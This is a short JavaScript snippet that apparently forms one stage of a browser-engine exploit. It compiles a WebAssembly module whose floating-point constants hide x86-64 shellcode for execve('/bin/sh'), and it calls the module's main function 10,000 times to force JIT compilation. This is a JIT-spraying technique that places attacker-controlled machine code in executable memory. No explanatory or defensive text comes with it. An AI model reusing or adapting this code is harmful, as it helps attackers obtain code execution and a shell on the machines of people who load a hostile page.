var importObject = {}
var code = new Uint8Array([0,97,115,109,1,0,0,0,1,8,2,96,0,1,124,96,0,0,3,3,2,0,1,7,14,2,4,109,97,105,110,0,0,3,102,111,111,0,1,10,76,2,71,0,68,104,110,47,115,104,88,235,7,68,104,47,98,105,0,91,235,7,68,72,193,224,24,144,144,235,7,68,72,1,216,72,49,219,235,7,68,80,72,137,231,49,210,235,7,68,49,246,106,59,88,144,235,7,68,15,5,144,144,144,144,235,7,26,26,26,26,26,26,11,2,0,11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, importObject);
var main = instance.exports.main;
for (let j = 0x0; j < 10000; j++) {
    main()
}
var foo = instance.exports.foo;
